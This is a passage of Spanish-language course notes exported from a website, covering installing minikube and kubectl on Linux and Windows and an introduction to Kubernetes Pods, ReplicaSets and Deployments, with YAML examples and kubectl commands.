ddac20b4b34a9c8c857fc602203b6ba2679794d3\n\nCreación del clúster de k8s\nEl siguiente paso consiste en lanzar minikube para que cree el cluster de Kubernetes de un solo nodo (master+worker). Minikube puede crear este cluster en diversos sistemas de virtualización o sobre docker, lo recomendable es visitar la página de “drivers” y seleccionar el método más adecuado para nuestro sistema.\nDe forma general, se creará el clúster de Kubernetes a través de minikube, mediante la instrucción:\nminikube start\n\nAunque de forma más concreta, especificaremos el “driver” a utilizar, por ejemplo:\nminikube start --driver=kvm2\n\nEsto creará de forma automática una máquina virtual o un contenedor en el sistema escogido e instalará Kubernetes en ella. Por último, se configura kubectl si está instalado (el cliente de línea de comandos de k8s) para que utilice el cluster recién instalado. Podemos ver una salida típica de la instalación del cluster a continuación:\n😄  minikube v1.29.0 en Debian 11.6\n✨  Using the kvm2 driver based on user configuration\n👍  Starting control plane node minikube in cluster minikube\n🔥  Creando kvm2 VM (CPUs=2, Memory=3900MB, Disk=20000MB) ...\n🐳  Preparando Kubernetes v1.25.3 en Docker 20.10.8...\n    ▪ Generating certificates and keys ...\n    ▪ Booting up control plane ...\n    ▪ Configuring RBAC rules ...\n🔎  Verifying Kubernetes components...\n    ▪ Using image gcr.io/k8s-minikube/storage-provisioner:v5\n🌟  Complementos habilitados: default-storageclass, storage-provisioner\n💡  kubectl not found. If you need it, try: &#039;minikube kubectl -- get pods -A&#039;\n🏄  Done! kubectl is now configured to use &quot;minikube&quot; cluster and &quot;default&quot; namespace by default\n\nEn la última línea de la salida podemos ver que se ha intentado configurar apropiadamente kubectl, a pesar de que no está instalado en el equipo, paso que haremos en el siguiente apartado.\nPodemos comprobar en cualquier momento el estado de minikube con la instrucción:\nminikube status\nminikube\ntype: Control Plane\nhost: Running\nkubelet: Running\napiserver: Running\nkubeconfig: Configured\n\nParada y reinicio de minikube\nPodemos parar y volver a arrancar minikube cuando sea preciso, ya que no se trata de un clúster de k8s en producción, sino de uno instalado en un equipo convencional. Esto se realiza mediante las instrucciones:\nminikube stop\n✋  Stopping node &quot;minikube&quot;  ...\n🛑  1 nodes stopped.\n\nminikube start\n😄  minikube v1.29.0 en Debian 11.6\n...\n\nInstalación de minikube sobre VirtualBox\nLa instalación es similar a la que hemos explicado en este apartado, simplemente cambiaremos el driver a la hora de crear la máquina de minikube:\nminikube start --driver=virtualbox\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.4-instalacion-de-minikube-en-windows-+-virtualbox":{"title":"2.4-instalacion-de-minikube-en-windows-+-virtualbox","links":[],"tags":[],"content":"2.4 Instalación de minikube en Windows + VirtualBox\nEn este apartado vamos a instalar minikube utilizando como sistema de virtualización VirtualBox.\nPaso 1: Instalación de VirtualBox\nSiga las instrucciones que encontrarás en la página oficial: www.virtualbox.org/.\nPaso 2: Descargamos minikube y lo instalamos\nAbrimos la PowerShell, como administrador, y ejecutamos :\nNew-Item -Path &#039;c:\\&#039; -Name &#039;minikube&#039; -ItemType Directory -Force\nInvoke-WebRequest -OutFile &#039;c:\\minikube\\minikube.exe&#039; -Uri &#039;github.com/kubernetes/minikube/releases/latest/download/minikube-windows-amd64.exe&#039; –UseBasicParsing\n\nEsta instrucción va a crear un directorio en c:/minikube y ahí va a depositar el ejecutable minikube.exe (70MB).\nPuedes seguir cualquier otro método de descargas que encontraras en la página oficial: minikube.sigs.k8s.io/docs/start/.\nA continuación, vamos añadir el binario minikube.exe al PATH:\n$oldPath = [Environment]::GetEnvironmentVariable(&#039;Path&#039;, [EnvironmentVariableTarget]::Machine)\nif ($oldPath.Split(&#039;;&#039;) -inotcontains &#039;C:\\minikube&#039;){ `\n  [Environment]::SetEnvironmentVariable(&#039;Path&#039;, $(&#039;{0};C:\\minikube&#039; -f $oldPath), [EnvironmentVariableTarget]::Machine) `\n}\n\nIMPORTANTE: Debemos cerrar la sesión, para que se cargue las variables de entorno.\nPodemos ver el valor del path: dir env:path|fl\nPaso 3: Creación del clúster de kubernetes con minikube\nEn este apartado vamos a crear un clúster de kubernetes de un nodo. En este caso minikube creará una máquina virtual (de 2Gb de RAM, 2 vcpu y 20G de almacenamiento) en VirtualBox utilizando una imagen que configura la máquina con kubernetes.\nCerramos el terminal PowerShell y la volvemos abrir como administrador.\nAveriguamos la versión de minikube :\n\nEjecutamos minikube start para que construya el clúster:\n\nNo hace falta indicar el driver, pero si tenemos algún problema podemos ejecutar minikube start - -driver=virtualbox. Lo debe coger automáticamente. No es necesario, tener abierto VirtualBox.\nComprobamos el estado de minikube:\n\nPodemos averiguar la IP asignada a la máquina donde se ha instalado el clúster ejecutando minikube ip (nos hará falta más adelante)(seguramente tu tendrás una ip diferente a la mostrada):\n\nCuando terminemos de trabajar con kubernetes es conveniente para la máquina, para ello: minikube stop. Y si por cualquier motivo necesitamos eliminar la máquina, ejecutaremos minikube delete."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.5-instalacion-y-configuracion-de-kubectl-en-linux":{"title":"2.5-instalacion-y-configuracion-de-kubectl-en-linux","links":[],"tags":[],"content":"2.5 Instalación y configuración de kubectl en linux\nkubectl es la herramienta de línea de comandos utilizada para interactuar con la API de Kubernetes. Es por tanto la herramienta fundamental que vamos a utilizar durante todo el curso para gestionar nuestros objetos en el clúster recién creado con minikube.\nkubectl está escrito en Go y de nuevo su instalación es muy simple, ya que se trata de un binario enlazado estáticamente y sin dependencias. Las instrucciones para su instalación están disponibles en la documentación de k8s. A continuación veremos algunas de las opciones que tenemos para instalarlo.\nOpción 1. Instalar binario desde el proyecto\nAl igual que hemos hecho con minikube, podemos descargar el binario directamente desde la URL del proyecto e instalarlo en /usr/local/bin:\ncurl -LO &quot;storage.googleapis.com/kubernetes-release/release/$(curl -s storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl&quot;\nsudo install kubectl /usr/local/bin/kubectl\n\nEste binario obviamente no se actualiza y tendremos que repetir el proceso cuando se actualice.\nOpción 2. Instalar desde repositorios no oficiales\nEl término repositorio no oficial se utiliza para aquellos repositorios que se añaden y que no son los propios de la distribución que estamos utilizando. En este caso, los repositorios no oficiales los proporciona el propio proyecto k8s.\nEn el caso de las distribuciones Debian y derivadas, el repositorio es packages.cloud.google.com/apt/ y en la documentación se detallan los pasos para instalar kubectl a través de apt.\nLa ventaja de este método respecto al anterior es que sí se actualizará kubectl adecuadamente como cualquier otro paquete que tengamos instalado en nuestra distro.\nOpción 3. Instalar desde repositorio oficial\nEn el caso de Debian, se ha añadido soporte para Kubernetes a partir de la versión bullseye o Debian 11, por lo que si tenemos instalada esa versión, podemos instalar kubectl directamente con apt:\nsudo apt install kubernetes-client\n\nEn estos momentos se instala la versión 1.20 de kubectl.\nOpción 4. Instalar desde snap\nUbuntu no proporciona de forma directa un paquete con el cliente de k8s, pero sí lo hace a través de snap, por lo que quienes utilicen dicho sistema, lo tienen disponible con un simple:\nsudo snap install kubectl --classic\n\nConfiguración kubectl\nUna vez instalado kubectl podemos comprobar que está disponible y cuál es su versión, con la instrucción:\nkubectl version --short\n...\nClient Version: v1.26.3\nKustomize Version: v4.5.7\nServer Version: v1.26.1\n\n\nEn el caso anterior, estamos utilizando la versión 1.22.2 y nos informa de que no ha podido conectarse al clúster de Kubernetes con la configuración por defecto (localhost:8080). Es decir, aunque tengamos kubectl y minikube instalados, el primero no está configurado todavía para conectarse al clúster de k8s que ejecuta minikube.\nLa solución más sencilla es parar minikube y volverlo a arrancar, porque de esta manera minikube configurará automáticamente kubectl. Si nos fijamos en la salida de minikube anterior, en la que no teníamos instalado kubectl, aparecía la línea:\n💡  kubectl not found. If you need it, try: &#039;minikube kubectl -- get pods -A&#039;\n\nPero si lo volvemos a repetir ahora, esa línea no aparecerá y se configurará kubectl para poder usar el clúster que proporciona minikube. Lo que va a hacer minikube es configurar el fichero ~/.kube/config de la siguiente manera:\napiVersion: v1\nclusters:\n- cluster:\n    certificate-authority: /home/alberto/.minikube/ca.crt\n    extensions:\n    - extension:\n        last-update: Sun, 30 Jan 2022 20:45:08 CET\n        provider: minikube.sigs.k8s.io\n        version: v1.24.0\n      name: cluster_info\n    server: https://192.168.39.115:8443\n  name: minikube\ncontexts:\n- context:\n    cluster: minikube\n    extensions:\n    - extension:\n        last-update: Sun, 30 Jan 2022 20:45:08 CET\n        provider: minikube.sigs.k8s.io\n        version: v1.24.0\n      name: context_info\n    namespace: default\n    user: minikube\n  name: minikube\ncurrent-context: minikube\nkind: Config\npreferences: {}\nusers:\n- name: minikube\n  user:\n    client-certificate: /home/alberto/.minikube/profiles/minikube/client.crt\n    client-key: /home/alberto/.minikube/profiles/minikube/client.key\n\nDonde en cada caso variará la dirección IP del servidor del clúster (en este caso la 192.168.39.221) y la ubicación de los ficheros de los certificados y claves x509 (en este caso en el directorio /home/alberto).\nUna vez configurado correctamente kubectl, podemos repetir el comando:\nkubectl version\n\nClient Version: version.Info{Major:&quot;1&quot;, Minor:&quot;23&quot;, GitVersion:&quot;v1.23.3&quot;, GitCommit:&quot;816c97ab8cff8a1c72eccca1026f7820e93e0d25&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2022-01-25T21:25:17Z&quot;, GoVersion:&quot;go1.17.6&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;}\nServer Version: version.Info{Major:&quot;1&quot;, Minor:&quot;22&quot;, GitVersion:&quot;v1.22.3&quot;, GitCommit:&quot;c92036820499fedefec0f847e2054d824aea6cd1&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2021-10-27T18:35:25Z&quot;, GoVersion:&quot;go1.16.9&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;}\n\nComprobamos que ya aparece la versión del servidor y por tanto se ha podido conectar con el clúster que gestiona minikube. Además podemos ejecutar nuestro primer comando propiamente de kubectl:\nkubectl get nodes\nNAME       STATUS   ROLES                  AGE   VERSION\nminikube   Ready    control-plane,master   21m   v1.22.3\n\nSi queremos utilizar el autocompletado, podemos generarlo e incorporarlo a nuestro entorno con:\necho &#039;source &lt;(kubectl completion bash)&#039; &gt;&gt;~/.bashrc\n\nY para poder usarlo en esta misma sesión (no será necesario más adelante, ya que el fichero .bashrc se lee cada vez que se inicia una sesión):\nsource ~/.bashrc\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.6-instalacion-y-configuracion-de-kubectl-en-windows":{"title":"2.6-instalacion-y-configuracion-de-kubectl-en-windows","links":[],"tags":[],"content":"2.6 Instalación y configuración de kubectl en windows\nPodemos encontrar la información donde nos explican la instalación de kubectl en la documentación. Vamos a elegir la opción de descargar el ejecutable, para ello accedemos a la PowerShell como administrador y en el directorio C./windows/system32 descargamos el ejecutable (por lo que lo vamos a tener disponible en el PATH). Para ello vamos a ejecutar:\ncurl.exe -LO storage.googleapis.com/kubernetes-release/release/v1.26.0/bin/windows/amd64/kubectl.exe\n\nUna vez instalado, desde una PowerShell sin acceso como administrador, podemos empezar a usar kubectl y comprobar si podemos acceder al clúster.\nPodemos comprobar la versión de kubectl:\n\nY ejecutar nuestro primer comando para obtener los nodos del clúster:\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.7-despliegues-de-aplicaciones-en-kubernetes":{"title":"2.7-despliegues-de-aplicaciones-en-kubernetes","links":[],"tags":[],"content":"2.7 Despliegues de aplicaciones en Kubernetes\nVamos a resumir brevemente, con la ayuda de un par de imágenes, la forma que tiene k8s de hacer despliegues de aplicaciones y lo compararemos con un despliegue “tradicional”.\nAunque un despliegue real tiene muchos más elementos que los que vamos a exponer a continuación, con idea de simplificarlo todo y centrarnos en la diferencia de los elementos que intervienen, supondremos una aplicación “tradicional” de dos capas, en las que una serie de equipos son los que están expuestos a Internet y los que pueden ejecutar una parte del código de la aplicación a través de servidores web (a los que de forma genérica denominaremos “front-end”), mientras que otra serie de equipos ejecutan otra parte de código y gestionan el almacenamiento y las bases de datos (a los que llamaremos de forma genérica “back-end”).\n\nEn la imagen anterior, vemos que el balanceador de carga expuesto al exterior recibe la petición, que asigna a alguna de las máquinas virtuales o físicas que forman el “front-end” y que éstas a su vez se comunican con alguna de las máquinas del “back-end” a través del balanceador de carga intermedio.\nEn el caso de Kubernetes, esto se realiza utilizando una serie de objetos internos, que normalmente se ejecutan sobre contenedores, denominados Pods, ReplicaSets, Deployments, Services e Ingress Controllers. Hay bastantes más objetos de k8s, pero nos centraremos en éstos que son los principales.\nEn la siguiente imagen podemos ver la forma en la que una petición externa se gestionaría:\n\nEn los siguientes módulos veremos uno a uno estos objetos de k8s y aprenderemos paso a paso cómo se interactúa con ellos y cómo se definen, pero a modo de resumen, podemos enumerar sus principales funciones en la siguiente lista:\n\nPods: ejecutan los contenedores\nReplicaSets:\n\nSe encargan de que no haya caída del servicio\nGestionan la tolerancia a fallos\nProporcionan escalabilidad dinámica\n\n\nDeployments:\n\nGestionan las actualizaciones continuas\nRealizan despliegues automáticos\n\n\nServices:\n\nGestionan el acceso a los pods\nBalancean la carga entre los Pods disponibles\n\n\nIngress:\n\nGestionan el acceso desde el exterior a través de nombre\n\n\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.0-contenedores-en-kubernetes":{"title":"3.0-contenedores-en-kubernetes","links":[],"tags":[],"content":"3. Contenedores en Kubernetes: Pods\nLa unidad más pequeña que puede utilizar Kubernetes es el Pod, en inglés Pod significa “vaina”, y podemos entender un Pod como una envoltura que contiene uno o varios contenedores (en la mayoría de los casos un solo contenedor). De forma genérica, un Pod representa un conjunto de contenedores que comparten almacenamiento y una única IP.\nUn aspecto muy importante que hay que ir asumiendo es que los Pods son efímeros, se lanzan y en determinadas circunstancias se paran o se destruyen, creando en muchos casos nuevos Pods que sustituyan a los anteriores. Esto tiene importantes ventajas a la hora de realizar modificaciones en los despliegues en producción, pero tiene una consecuencia directa sobre la información que pueda tener almacenada el Pod, por lo que tendremos que utilizar algún mecanismo adicional cuando necesitemos que la información sobreviva a un Pod. Por lo tanto, aunque Kubernetes es un orquestador de contenedores, la unidad mínima de ejecución es el Pod, que contendrá uno a más contenedores según las necesidades:\n\nEn la mayoría de los casos y siguiendo el principio de un proceso por contenedor, evitamos tener sistemas (como máquinas virtuales) ejecutando docenas de procesos, por lo que lo más habitual será tener un Pod en cuyo interior se define un contenedor que ejecuta un solo proceso.\nEn determinadas circunstancias será necesario ejecutar más de un proceso en el mismo “sistema”, como en los casos de procesos fuertemente acoplados, en esos casos, tendremos más de un contenedor dentro del Pod. Cada uno de los contenedores ejecutando un solo proceso, pero pudiendo compartir almacenamiento y una misma dirección IP como si se tratase de un sistema ejecutando múltiples procesos.\n\nExisten además algunas razones que hacen que sea conveniente tener esta capa adicional por encima de la definición de contenedor:\n\nKubernetes puede trabajar con distintos sistemas de gestión de contenedores (docker, containerd, rocket, cri-o, etc) por lo que es muy conveniente añadir una capa de abstracción que permita utilizar Kubernetes de una forma homogénea e independiente del sistema de contenedores interno asociado.\nEsta capa de abstracción añade información adicional necesaria en Kubernetes como por ejemplo, políticas de reinicio, comprobaciones de que la aplicación esté inicializada (readiness probe) o comprobaciones de que la aplicación haya realizado alguna acción especificada (liveness probe).\n\n\nPod con un solo contenedor\nEn la situación más habitual, se definirá un Pod con un contenedor en su interior para ejecutar un solo proceso y este Pod estará ejecutándose mientras lo haga el correspondiente proceso dentro del contenedor. Algunos ejemplos pueden ser: ejecución en modo demonio de un servidor web, ejecución de un servidor de aplicaciones Java, ejecución de una tarea programada, ejecución en modo demonio de un servidor DNS, etc.\n\nPod multicontenedor\nEn algunos casos la ejecución de un solo proceso por contenedor no es la solución ideal, ya que existen procesos fuertemente acoplados que no pueden comunicarse entre sí fácilmente si se ejecutan en diferentes sistemas, por lo que la solución planteada en esos casos es definir un Pod multicontenedor y ejecutar cada proceso en un contenedor, pero que puedan comunicarse entre sí como si lo estuvieran haciendo en el mismo sistema, utilizando un dispositivo de almacenamiento compartido si hiciese falta (para leer, escribir ficheros entre ellos) y compartiendo externamente una misma dirección IP. Un ejemplo típico de un Pod multicontenedor es un servidor web nginx con un servidor de aplicaciones PHP-FPM, que se implementaría mediante un solo Pod, pero ejecutando un proceso de nginx en un contenedor y otro proceso de php-fpm en otro contenedor.\nAl tratarse este curso de un curso de introducción a Kubernetes no vamos a poder ver todas las cargas de trabajo, ni la ejecución y despliegue de todo tipo de aplicaciones, por lo que consideramos más razonable no utilizar ejemplos de Pods multicontenedor y centrarnos en la comprensión de las características principales de Kubernetes mediante ejemplos sencillos, comunes y muy apropiados para ejecutarse en Kubernetes, mediante en uso de Pods con un solo contenedor."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.1-describiendo-un-pod":{"title":"3.1-describiendo-un-pod","links":[],"tags":[],"content":"3.1 Describiendo un pod\nEs posible crear un Pod directamente (lo que se denomina utilización imperativa) mediante kubectl:\nkubectl run pod-nginx --image=nginx\n\nDe esta forma se crea un Pod con un contenedor que utiliza la imagen nginx:latest (no hemos especificado una versión) del registro que esté definido por defecto en el cluster de Kubernetes, se asigna una dirección IP y se lanza en uno de los nodos del cluster.\nUn Pod tiene otros muchos parámetros asociados, que en este caso quedarán sin definir o Kubernetes asumirá los valores por defecto. Sin embargo es mucho más habitual trabajar con los objetos de Kubernetes de manera declarativa, definiendo los objetos de forma detallada a través de un fichero en formato YAML. De esta forma tenemos un fichero con la definición del objeto que hemos lanzado y podemos utilizar en otro momento exactamente la misma definición o podemos ir modificándola y aplicando los cambios cuando sea conveniente.\nUn ejemplo podría ser el contenido del fichero pod.yaml:\napiVersion: v1 # required\nkind: Pod # required\nmetadata: # required\n name: pod-nginx # required\n labels:\n   app: nginx\n   service: web\nspec: # required\n containers:\n   - image: nginx:1.16\n     name: contenedor-nginx\n     imagePullPolicy: Always\n\nVeamos cada uno de los parámetros que hemos definido:\n\napiVersion: v1: La versión de la API que vamos a usar.\nkind: Pod: La clase de recurso que estamos definiendo.\nmetadata: Información que nos permite identificar unívocamente el recurso:\n\nname: Nombre del pod\nlabels: Las Labels nos permiten etiquetar los recursos de Kubernetes (por ejemplo un pod) con información del tipo clave/valor.\n\n\nspec: Definimos las características del recurso. En el caso de un Pod indicamos los contenedores que van a formar el Pod (sección containers), en este caso sólo uno.\n\nimage: La imagen desde la que se va a crear el contenedor\nname: Nombre del contenedor.\nimagePullPolicy: Las imágenes se guardan en un registro interno. Se pueden utilizar registros públicos (google o docker hub son los más usados) y registros privados. La política por defecto es IfNotPresent, que se baja la imagen si no está en el registro interno. Si queremos forzar la descarga desde el repositorio externo, tendremos que indicar imagePullPolicy:Always.\n\n\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.2-gestionando-los-pods":{"title":"3.2-gestionando-los-pods","links":[],"tags":[],"content":"3.2 Gestionando los pods\nTenemos un fichero pod.yaml, donde hemos definido un Pod de la siguiente manera:\napiVersion: v1\nkind: Pod\nmetadata:\n name: pod-nginx\n labels:\n   app: nginx\n   service: web\nspec:\n containers:\n   - image: nginx:1.16\n     name: contenedor-nginx\n     imagePullPolicy: Always\n\nPodemos crear directamente el Pod desde el fichero yaml:\nkubectl create -f pod.yaml\n\nY podemos ver el estado en el que se encuentra y si está o no listo:\nkubectl get pods\n\n(Sería equivalente usar po, pod o pods).\nSi queremos ver más información sobre los Pods, como por ejemplo, saber en qué nodo del cluster se está ejecutando:\nkubectl get pod -o wide\n\nPara obtener información más detallada del Pod (equivalente al inspect de docker):\nkubectl describe pod pod-nginx\n\nPodríamos editar el Pod y ver todos los atributos que definen el objeto, la mayoría de ellos con valores asignados automáticamente por el propio Kubernetes y podremos actualizar ciertos valores:\nkubectl edit pod pod-nginx\n\nSin embargo, es una opción compleja para utilizarla a estas alturas del curso y hay que comprender mejor cómo funcionan los objetos de Kubernetes para poder hacer modificaciones de forma apropiada, y además, veremos más adelante otra manera más correcta de actualizar un objeto de Kubernetes.\nNormalmente no se interactúa directamente con el Pod a través de una shell, pero sí se obtienen directamente los logs al igual que se hace en docker:\nkubectl logs pod-nginx\n\nEn el caso poco habitual de que queramos ejecutar alguna orden adicional en el Pod, podemos utilizar el comando exec, por ejemplo, en el caso particular de que queremos abrir una shell de forma interactiva:\nkubectl exec -it pod-nginx -- /bin/bash\n\nPodemos acceder a la aplicación, redirigiendo un puerto de localhost al puerto de la aplicación:\nkubectl port-forward pod-nginx 8080:80\n\nY accedemos al servidor web en la url http://localhost:8080.\nNOTA: Esta no es la forma con la que accedemos a las aplicaciones en Kubernetes. Para el acceso a las aplicaciones usaremos un recurso llamado Service. Con la anterior instrucción lo que estamos haciendo es una redirección desde localhost el puerto 8080 al puerto 80 del Pod y es útil para pequeñas pruebas de funcionamiento, nunca para acceso real a un servicio. NOTA2: El port-forward no es igual a la redirección de puertos de docker, ya que en este caso la redirección de puertos se hace en el equipo que ejecuta kubectl, no en el equipo que ejecuta los Pods o los contenedores.\nPara obtener las etiquetas de los Pods que hemos creado:\nkubectl get pods --show-labels\n\nLas etiquetas las hemos definido en la sección metadata del fichero yaml, pero también podemos añadirlos a los Pods ya creados:\nkubectl label pods pod-nginx service=web --overwrite=true\n\nLas etiquetas son muy útiles, ya que permiten seleccionar un recurso determinado (en un cluster de Kubernetes puede haber cientos o miles de objetos).Por ejemplo para visualizar los Pods que tienen una etiqueta con un determinado valor:\nkubectl get pods -l service=web\n\nTambién podemos visualizar los valores de las etiquetas como una nueva columna:\nkubectl get pods -Lservice\n\nY por último, eliminamos el Pod mediante:\nkubectl delete pod pod-nginx\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.0-tolerancia-y-escalabilidad":{"title":"4.0-tolerancia-y-escalabilidad","links":[],"tags":[],"content":"4. Tolerancia y escalabilidad: ReplicaSets\nReplicaSet es un recurso de Kubernetes que asegura que siempre se ejecuta un número de réplicas concreto de un Pod determinado. Por lo tanto, nos garantiza que un conjunto de Pods siempre están funcionando y disponibles proporcionándonos las siguientes características: Tolerancia a fallos y Escalabilidad dinámica.\nAunque en el módulo anterior estudiamos como gestionar el ciclo de vida de los Pods, en Kubernetes no vamos a trabajar directamente con Pods. Un recurso ReplicaSet controla un conjunto de Pods y es el responsable de que estos Pods siempre estén ejecutándose (Tolerancia a fallos) y de aumentar o disminuir las réplicas de dicho Pod (Escalabilidad dinámica). Estas réplicas de los Pods se ejecutarán en nodos distintos del cluster, aunque en nuestro caso al utilizar minikube, un cluster de un solo nodo, no vamos a poder apreciar como se reparte la ejecución de los Pods en varios nodos, todos los Pods se ejecutarán en la misma máquina.\nEl ReplicaSet va a hacer todo lo posible para que el conjunto de Pods que controla siempre se estén ejecutando. Por ejemplo: si el nodo del cluster donde se están ejecutando una serie de Pods se apaga, el ReplicaSet crearía nuevos Pods en otro nodo para tener siempre ejecutando el número que hemos indicado. Si un Pod se para por cualquier problema, el ReplicaSet intentará que vuelva a ejecutarse para que siempre tengamos el número de Pods deseado."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.1-describiendo-un-replicaset":{"title":"4.1-describiendo-un-replicaset","links":[],"tags":[],"content":"4.1 Describiendo un ReplicaSet\nEn este caso también vamos a definir el recurso de ReplicaSet en un fichero nginx-rs.yaml, por ejemplo como este:\napiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: replicaset-nginx\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n        - image: nginx\n          name: contenedor-nginx\n\nAlgunos de los parámetros definidos ya lo hemos estudiado en la definición del Pod. Los nuevos parámetros de este recurso son los siguientes:\n\nreplicas: Indicamos el número de Pods que siempre se deben estar ejecutando.\nselector: Seleccionamos los Pods que va a controlar el ReplicaSet por medio de las etiquetas. Es decir este ReplicaSet controla los Pods cuya etiqueta app es igual a nginx.\ntemplate: El recurso ReplicaSet contiene la definición de un Pod. Fíjate que el Pod que hemos definido en la sección template tiene indicado la etiqueta necesaria para que sea seleccionado por el ReplicaSet (app: nginx).\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.2-gestionando-los-replicaset":{"title":"4.2-gestionando-los-replicaset","links":[],"tags":[],"content":"4.2 Gestionando los ReplicaSet\nCreación del ReplicaSet\nAunque en la unidad anterior usamos kubectl create para crear los recursos de nuestro cluster, es recomendable usar kubectl apply. La diferencia es la forma en la que actuamos sobre el cluster:\n\n\nConfiguración imperativa de objetos: La definición del objeto está guardada en un fichero Yaml y ejecutamos un comando imperativo. Posteriormente no podremos modificar el objeto, habrá que borrarlo y crearlo de nuevo. Ejemplos:\n  kubectl create -f recurso.yaml\n  kubectl delete -f recurso.yaml\n\n\n\nConfiguración declarativa de objetos: No se definen las acciones a realizar. Cuando se aplica la configuración del objeto estamos indicando un estado deseado al que queremos llegar. Posteriormente si la definición cambia, podremos cambiar el objeto. Recomendado en producción. Ejemplo:\n  kubectl apply -f recurso.yaml\n\n\n\nPor lo tanto para crear nuestro ReplicaSet, ejecutamos:\nkubectl apply -f nginx-rs.yaml\n\nY podemos ver los recursos que se han creado con:\nkubectl get rs,pods\n\nObservamos que queríamos crear 2 replicas del Pod, y efectivamente se han creado.\nSi queremos obtener información detallada del recurso ReplicaSet que hemos creado:\nkubectl describe rs replicaset-nginx\n\n\nTolerancia a fallos\nY ahora comenzamos con las funcionalidades llamativas de Kubernetes. ¿Qué pasaría si borro uno de los Pods que se han creado? Inmediatamente se creará uno nuevo para que siempre estén ejecutándose los Pods deseados, en este caso 2:\nkubectl delete pod &lt;nombre_del_pod&gt;\nkubectl get pods\n\n\nEscalabilidad\nPara escalar el número de pods:\nkubectl scale rs replicaset-nginx --replicas=5\nkubectl get pods\n\nOtra forma de hacerlo sería cambiando el parámetro replicas de fichero yaml, y volviendo a ejecutar:\nkubectl apply -f nginx-rs.yaml\n\nLa escalabilidad puede ser para aumentar el número de Pods o para reducirla:\nkubectl scale rs replicaset-nginx --replicas=1\n\n\nEliminando el ReplicaSet\nPor último, si borramos un ReplicaSet se borrarán todos los Pods asociados:\nkubectl delete rs replicaset-nginx\n\nOtra forma de borrar el recurso, es utilizar el fichero yaml:\nkubectl delete -f nginx-rs.yaml\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.0-deployments":{"title":"5.0-deployments","links":[],"tags":[],"content":"5. Despliegues: Deployments\nEl despliegue o Deployment es la unidad de más alto nivel que podemos gestionar en Kubernetes.\nEn los módulos anteriores hemos estudiado los Pods y los ReplicaSet, sin embargo, cuando queramos desplegar una aplicación en Kubernetes no vamos a gestionar éstos directamente, sino que vamos a crear un recurso de tipo Deployment. ¿Qué ocurre cuando creamos un nuevo recurso Deployment?\n\nLa creación de un Deployment conlleva la creación de un ReplicaSet que controlará un conjunto de Pods creados a partir de la versión de la imagen que se ha indicado.\nSi hemos desarrollado una nueva versión de la aplicación y hemos creado una nueva imagen con la nueva versión, podemos modificar el Deployment indicando la nueva versión de la imagen. En ese momento se creará un nuevo ReplicaSet que controlará un nuevo conjunto de Pods creados a partir de la nueva versión de la imagen (habremos desplegado una nueva versión de la aplicación).\nPor lo tanto podemos decir que un Deployment va guardando un historial con los ReplicaSet que se van creando al ir cambiado la versión de la imagen. El ReplicaSet que esté activo en un determinado momento será el responsable de crear los Pods con la versión actual de la aplicación.\nSi tenemos un historial de ReplicaSet según las distintas versiones de la imagen que estamos utilizando, podemos, de una manera sencilla, volver a una versión anterior de la aplicación (Rollback).\n\nPor la manera de trabajar de un Deployment, podemos indicar las funciones que nos aporta:\n\nControl de réplicas\nEscalabilidad de pods\nActualizaciones continuas\nDespliegues automáticos\nRollback a versiones anteriores\n\n\nArquitectura de nuestras aplicaciones\nTenemos dos clases de aplicaciones que podemos desplegar en un cluster de Kubernetes:\n\nAplicaciones que necesitan varios servicios para ejecutarse: por ejemplo una aplicación escrita en PHP y servida por un servidor web que necesita un servidor de base de datos para guardar la información. En este caso crearemos dos recursos Deployment: uno para desplegar la aplicación PHP y otro para desplegar la base de datos. Por cada servicio que necesite nuestra aplicación crearemos un Deployment para desplegarlo.\nAplicaciones construidas con microservicios: cada microservicio se puede desplegar de manera autónoma. Por cada microservicio que forma parte de la aplicación crearemos un recurso Deployment. Por ejemplo, una aplicación que tenga un frontend para ofrecer la información y que haga llamadas a un backend que ofrece un servicio web por medio de una API RESTful.\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.1-describiendo-un-deployment":{"title":"5.1-describiendo-un-deployment","links":[],"tags":[],"content":"5.1 Describiendo un deployment\nPodemos crear un Deployment de forma imperativa utilizando un comando como el siguiente (se podrían indicar muchos más parámetros de configuración que podemos consultar en la documentación):\nkubectl create deployment nginx --image nginx\n\nNosotros, sin embargo, vamos a seguir describiendo los recursos en un fichero yaml. En este caso para describir un Deployment de nginx podemos escribir un fichero nginx-deployment.yaml:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment-nginx\n  labels:\n    app: nginx\nspec:\n  revisionHistoryLimit: 2\n  strategy:\n    type: RollingUpdate\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: nginx\n        name: contendor-nginx\n        ports:\n        - name: http\n          containerPort: 80\n\nLa creación de un Deployment crea un ReplicaSet y los Pods correspondientes. Por lo tanto en la definición de un Deployment se define también el ReplicaSet asociado (los parámetros replicas, selector y template). Los atributos relacionados con el 